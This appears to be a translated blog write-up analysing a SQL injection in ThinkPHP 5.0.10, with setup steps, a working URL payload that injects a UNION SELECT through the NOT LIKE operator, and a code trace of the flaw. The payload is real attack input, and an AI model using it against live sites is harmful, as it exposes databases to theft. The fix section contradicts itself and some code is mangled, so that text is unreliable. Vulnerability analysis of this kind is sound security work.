# ThinkPHP5.0.10 SQL Injection

Author: H3rmesk1t

Data: 2021.08.13

# Vulnerability Summary
- This vulnerability exists in the parseWhereItem method of the Mysql class. Since the program does not filter the data well, it directly splices the data into SQL statements; another way, the filterValue method of the Request class misses filtering NOT LIKE keywords, which ultimately leads to the occurrence of SQL injection vulnerability
- Vulnerability impact version: ThinkPHP=5.0.10

# Initial configuration

Get the test environment code

```bash
composer create-project --prefer-dist topthink/think=5.0.10 tpdemo
```
![Insert the picture description here](https://img-blog.csdnimg.cn/d24f5ac50d22475ea572e510632df2e1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Set the require field of the composer.json file to the following

```bash
"require": {
    "php": ">=5.4.0",
    "topthink/framework": "5.0.10"
},
```

Then execute `composer update` and set the `application/index/controller/Index.php` file code as follows

![Insert the picture description here](https://img-blog.csdnimg.cn/1835c360adee4a9380b9451fc4a131ea.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $username = request()->get('username/a');
        $result = db('users')->where(['username' =$username])->select();
        var_dump($result);
        return '<style type="text/css">*{ padding: 0; margin: 0; } .think_default_text{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"<h1>:)</h1><pThinkPHP V5<br/><span style="font-size:30px">Ten years of hard work - A high-performance framework designed for API development</span></p><span style="font-size:22px;">[ V5.0 version is exclusively sponsored by <a href="http://www.qiniu.com" target="qiniu">Qiu Cloud</a]</span></div><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_bd568ce7058a1091"></thinkad>';
    }
}
?>
```

Configure database-related information in the `config/database.php` file, and enable `app_debug` and `app_trace` in `config/app.php` to create the database information as follows

````sql
create database thinkphp;
use thinkphp;
create table users(
	id int primary key auto_increment,
	username varchar(50) not null
);
insert into users(id,username) values(1,'H3rmesk1t');
```
# Vulnerability Exploit

Payload

```ph
http://127.0.0.1/cms/public/index.php/index/index?username[0]=not%20like&username[1][0]=%%&username[1][1]=233&username[2]=)%20union%20select%201,user()%23
```
![Insert the picture description here](https://img-blog.csdnimg.cn/b238b56d42d742eab36f90349b3bf7f3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Vulnerability Analysis

First of all, no matter how the data is passed to the server, the data will be passed through the `input` method of the `Request` class in ThinkPHP. The data will not only be cast, but will also be processed by the `filterValue` method. This method is used to filter expressions in the form, but the code does not filter `NOT LIKE`, and this vulnerability takes advantage of this.

Follow up with `thinkphp/library/think/Request.php`, in the `input` method, the incoming data will be filtered and casted by `filterValue`, and then return

![Insert the picture description here](https://img-blog.csdnimg.cn/0dc7562d733b40408bcef48b15740996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Follow up on the `filterValue` method to see how it is implemented. I found that the `filterExp` method is called and you can see that `NOT LIKE` is not filtered.

![Insert the picture description here](https://img-blog.csdnimg.cn/410c5c53790b41a9be838ea0397570f1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Continue to follow up on ThinkPHP's method of processing SQL statements. First, the program calls the `where` method of the `Query` class, analyzes the query expression through its `parseWhereExp` method, and then returns and continues to call the `select` method. Prepare to start building the `select` statement.

![Insert the picture description here](https://img-blog.csdnimg.cn/2a2a4df416a24d009187ce18d000f330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
!
[Insert the picture description here](https://img-blog.csdnimg.cn/5f6348d163c84d78884284e0442114d1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

The `$this->builder` here is the `think\db\builder\Mysql` class, and the `Mysql` class inherits from the `Builder` class, so it continues to call the `select` method of the `Builder` class, which calls the `parseWhere` method, and then calls the `buildWhere` method. The method continues to call the `parseWhereItem` method, follow up with the method

![Insert the picture description here](https://img-blog.csdnimg.cn/bba6e107e264477c80505659edf5e5c9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/5c0dabb4b6b04dc7a618510b717429f5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Here, when the operator `$exp` is `NOT LIKE` or `LIKE`, the logical control character of MySQL is controllable, and then splicing is returned and executed in the SQL statement, resulting in a SQL injection vulnerability

![Insert the picture description here](https://img-blog.csdnimg.cn/d7ccb54cc93445eb9454fac2ff94eb27.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/d26d15a2ba4e460783ec90ed7f364373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

The executed SQL statement is:
````sql
(`username` NOT LIKE '%%' ) UNION SELECT 1,USER()# `username` NOT LIKE '233')
```

Complete method call, from bottom to top

![Insert the picture description here](https://img-blog.csdnimg.cn/06ab809b6794427e8ea486d0f5420010.png#pic_center)
# Vulnerability Fix

In the `filterValue` version of the `Request.php` file, the `NOT LIKE` keyword is filtered out. In the `filterValue` version of the `Request.php` file, the `NOT LIKE` keyword is filtered out. In the `Request.php` version before 5.0.10, the vulnerability does not exist, but its code does not filter out the `NOT LIKE` keyword; after debugging, it was found that in the `NOT LIKE` version before 5.0.10, the default allowed expression does not exist in the `NOT LIKE` expression, so the vulnerability can be triggered.

![Insert the picture description here](https://img-blog.csdnimg.cn/a4c2903335d94c5d92f9f32bdee3c473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Attack summary

Refer to Master Mochazz's audit process

![Insert the picture description here](https://img-blog.csdnimg.cn/691f1e6404b946928440a5182373f70b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)